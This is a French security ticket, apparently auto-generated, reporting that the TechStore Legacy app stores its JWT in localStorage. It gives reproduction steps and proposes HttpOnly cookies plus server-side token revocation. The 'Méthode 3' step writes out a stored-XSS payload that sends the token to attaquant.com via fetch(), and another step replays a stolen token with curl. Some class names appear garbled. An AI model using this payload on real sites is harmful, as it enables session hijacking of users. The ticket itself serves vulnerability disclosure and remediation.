# 🔴 [CRITIQUE] [SECURITE] - JWT stocké en localStorage - Vulnérabilité XSS

**ID** : TICKET-SEC-002  
**Crée le** : 22/09/2026  
**Par** : Analyse automatique  
**État** : Ouvert  
**Priorité** : **CRITIQUE**  
**Criticité** : **Élevée** (Risque de vol de session et usurpation d'identité)  

---

## 📌 DESCRIPTION

Le **token JWT** est stocké dans `localStorage` côté client (fichier `public/assets/js/app.js:6`). Cette pratique est **dangereuse** car `localStorage` est accessible en JavaScript, rendant le token vulnérable aux **attaques XSS (Cross-Site Scripting)**.

Si une faille XSS existe (même mineure) dans l'application, un attaquant peut **lire le token JWT** et **usurper l'identité** de l'utilisateur connecté pour effectuer des actions en son nom (valider des commandes, accéder à ses données, etc.).

---

## 🔍 ÉTAPES POUR REPRODUIRE

### Prérequis
- Application TechStore Legacy en cours d'exécution
- Navigateur moderne (Chrome, Firefox, Edge)
- Compte utilisateur valide (ex: `alice.martin@example.test` / `password`)

### Méthode 1 : Vérification du stockage du token
1. Se connecter à l'application via `http://localhost:8000/login`
2. Ouvrir les outils de développement (F12) → onglet **Application**
3. Naviguer vers **Storage** → **Local Storage** → `http://localhost:8000`
4. **Observer** la présence des clés :
   - `techstore_token` : Contient le JWT
   - `techstore_user` : Contient les informations utilisateur
   - `techstore_cart` : Contient le panier

### Méthode 2 : Simulation d'une attaque XSS (Proof of Concept)
1. Se connecter à l'application
2. Dans la console JavaScript, exécuter :
   ```javascript
   // Récupération du token via XSS simulé
   const token = localStorage.getItem('techstore_token');
   const user = localStorage.getItem('techstore_user');
   console.log('Token JWT volé:', token);
   console.log('Infos utilisateur:', user);
   ```
3. **Résultat** : Le token et les informations utilisateur sont **accessibles et affichés**

### Méthode 3 : Attaque via injection de script (si XSS possible)
1. Supposons qu'une faille XSS existe dans l'affichage d'un produit (ex: champ `name` ou `description`)
2. Un attaquant injecte dans la base :
   ```sql
   UPDATE products SET name = '<script>fetch("https://attaquant.com/steal?token="+localStorage.getItem("techstore_token"));</script>' WHERE id = 1;
   ```
3. Lorsqu'un utilisateur connecté visite la page du produit, le script s'exécute et **envoie le token à l'attaquant**

### Méthode 4 : Vérification de la validité du token volé
1. Récupérer le token via la Méthode 2
2. Utiliser ce token dans une requête API :
   ```bash
   curl -X GET http://localhost:8000/api/me \
     -H "Authorization: Bearer <TOKEN_VOLE>"
   ```
3. **Résultat** : La requête **réussit** et retourne les informations de l'utilisateur

---

## ✅ RESULTAT ATTENDU

- Le token JWT **ne doit PAS être accessible via JavaScript**
- Le token doit être stocké dans un **cookie HttpOnly, Secure, SameSite**
- Même en cas de XSS, l'attaquant **ne peut pas accéder au token**
- Le token doit être **invalidable** côté serveur

---

## ❌ RESULTAT ACTUEL

- ✅ Le token est **accessible via `localStorage.getItem('techstore_token')`**
- ✅ Le token peut être **utilisé pour des requêtes API authentifiées**
- ✅ **Aucune protection** contre le vol via XSS
- ❌ **Aucun mécanisme d'invalidation** du token

---

## 📊 PREUVES

### Code vulnérable
**Fichier** : `public/assets/js/app.js:5-10`

```javascript
const store = {
    token: localStorage.getItem('techstore_token') || '',      // ⚠️ VULNERABLE
    user: JSON.parse(localStorage.getItem('techstore_user') || 'null'),  // ⚠️ VULNERABLE
    cart: JSON.parse(localStorage.getItem('techstore_cart') || '[]'),
    discount: Number(localStorage.getItem('techstore_discount') || '0')
};
```

**Fichier** : `public/assets/js/app.js:306-309` (Sauvegarde du token)

```javascript
store.token = data.token;
store.user = data.user;
localStorage.setItem('techstore_token', store.token);  // ⚠️ STOCKAGE DANGEREUX
localStorage.setItem('techstore_user', JSON.stringify(store.user));
```

### Preuve de concept : Token accessible
```javascript
// Dans la console du navigateur, après connexion :
> localStorage.getItem('techstore_token')
< "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOjEsInJvbGUiOiJjdXN0b21lciIsImlhdCI6MTY5NjMwNDAwMCwiZXhwIjoxNjk2MzA3NjAwfQ.signature..."
```

---

## 🛡️ SOLUTION PROPOSÉE

### Solution 1 : Passer aux cookies HttpOnly (Recommandée)

#### Frontend (`public/assets/js/app.js`)
```javascript
// Remplacer localStorage par des cookies
// Supprimer la lecture/écriture en localStorage pour le token

// Fonction pour lire un cookie
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
    return null;
}

// Le token n'est plus accessible via JavaScript
const store = {
    token: getCookie('techstore_token') || '',  // ✅ Secure (HttpOnly)
    user: JSON.parse(localStorage.getItem('techstore_user') || 'null'),
    cart: JSON.parse(localStorage.getItem('techstore_cart') || '[]'),
    discount: Number(localStorage.getItem('techstore_discount') || '0')
};
```

#### Backend (`src/Controller/AuthController.php`)
```php
public function login(): void
{
    // ... code existant ...
    
    $token = $this->jwtService->createToken($user);
    
    // Envoyer le token dans un cookie HttpOnly
    setcookie(
        'techstore_token',
        $token,
        [
            'expires' => time() + 3600,
            'path' => '/',
            'domain' => '',
            'secure' => true,     // HTTPS uniquement
            'httponly' => true,   // Inaccessible via JavaScript
            'samesite' => 'Lax'    // Protection CSRF partielle
        ]
    );
    
    $this->json([
        'message' => 'Connexion réussie',
        'user' => [
            'id' => (int) $user['id'],
            'email' => $user['email'],
            'first_name' => $user['first_name'],
            'last_name' => $user['last_name'],
            'role' => $user['role'],
        ],
    ]);
}
```

#### Backend (`src/Auth/AuthHelper.php`)
```php
public function currentUser(): ?array
{
    $token = $_COOKIE['techstore_token'] ?? '';  // Lire depuis le cookie
    
    if (empty($token)) {
        return null;
    }
    
    $claims = $this->jwtService->readToken($token);
    // ... reste du code ...
}
```

### Solution 2 : Implémenter une liste de tokens révoqués (Recommandée en complément)

#### Nouvelle table SQL (`database/schema.sql`)
```sql
CREATE TABLE token_blacklist (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token_hash TEXT NOT NULL UNIQUE,
    expires_at TEXT NOT NULL
);
```

#### Service de vérification (`src/Auth/JwtService.php`)
```php
public function readToken(string $token): ?array
{
    // Vérifier si le token est blacklisté
    if ($this->isTokenBlacklisted($token)) {
        return null;
    }
    
    // ... code existant ...
}

private function isTokenBlacklisted(string $token): bool
{
    $hash = hash('sha256', $token);
    $stmt = $this->pdo->prepare('SELECT 1 FROM token_blacklist WHERE token_hash = ? AND expires_at > datetime("now")');
    $stmt->execute([$hash]);
    return $stmt->fetch() !== false;
}
```

#### Déconnexion (`src/Controller/AuthController.php`)
```php
public function logout(): void
{
    $token = $_COOKIE['techstore_token'] ?? '';
    if ($token) {
        $hash = hash('sha256', $token);
        $expires = date('Y-m-d H:i:s', time() + 3600); // Même durée que le token
        
        $stmt = $this->pdo->prepare('INSERT INTO token_blacklist (token_hash, expires_at) VALUES (?, ?)');
        $stmt->execute([$hash, $expires]);
    }
    
    // Supprimer le cookie
    setcookie('techstore_token', '', time() - 3600, '/');
    
    $this->json(['message' => 'Déconnexion réussie']);
}
```

---

## 📝 NOTES TECHNIQUES

### Pourquoi localStorage est dangereux
1. **Accessible via JavaScript** : Toute faille XSS donne accès au token
2. **Pas de flag HttpOnly** : Contrairement aux cookies HttpOnly
3. **Pas de flag Secure** : Pas de restriction HTTPS
4. **Pas de politique SameSite** : Vulnérable aux attaques CSRF

### Comparaison : localStorage vs Cookies HttpOnly

| Critère | localStorage | Cookie HttpOnly |
|---------|--------------|-----------------|
| Accessible via JS | ✅ Oui | ❌ Non |
| Vulnérable à XSS | ✅ Oui | ❌ Non |
| Nécessite HTTPS | ❌ Non | ✅ Recommandé |
| Envoi automatique | ❌ Non | ✅ Oui (avec path) |
| Taille max | ~5MB | ~4KB |

### Classes concernées
- `TechStore\ControlleraseAuthController`
- `TechStore\ControllerasePageController` (pour les templates)
- `TechStoreaseAuthaseAuthHelper`
- `TechStoreaseAuthaseJwtService`

### Fichiers concernés
- `public/assets/js/app.js` (stockage et lecture)
- `src/Controller/AuthController.php` (émission du token)
- `src/Auth/AuthHelper.php` (lecture du token)
- `src/Auth/JwtService.php` (gestion du token)

---

## ✅ CRITÈRES D'ACCEPTATION

- [ ] Le token JWT **n'est PAS accessible via `localStorage.getItem()`**
- [ ] Le token est stocké dans un **cookie HttpOnly**
- [ ] Le cookie a les flags **Secure** et **SameSite=Lax/Strict**
- [ ] Le token **ne peut pas être lu via JavaScript** dans la console
- [ ] La **déconnexion invalide le token** côté serveur
- [ ] Les **requêtes API fonctionnent toujours** avec le nouveau système
- [ ] Les **tests unitaires** vérifient que le token n'est pas accessible via JS
- [ ] La **documentation** est mise à jour

---

## 🔗 LIENS

- **Issue liée** : DFAUT-SEC-002 (dans ANALYSE_DEFAUTS.md)
- **Fichier source** : `public/assets/js/app.js`, `src/Auth/JwtService.php`, `src/Auth/AuthHelper.php`
- **Documentation** : Voir CARTOGRAPHIE.md, section 2.1.2

---

**Étiquettes** : `securite`, `critique`, `xss`, `jwt`, `authentification`, `frontend`, `backend`, `p0`
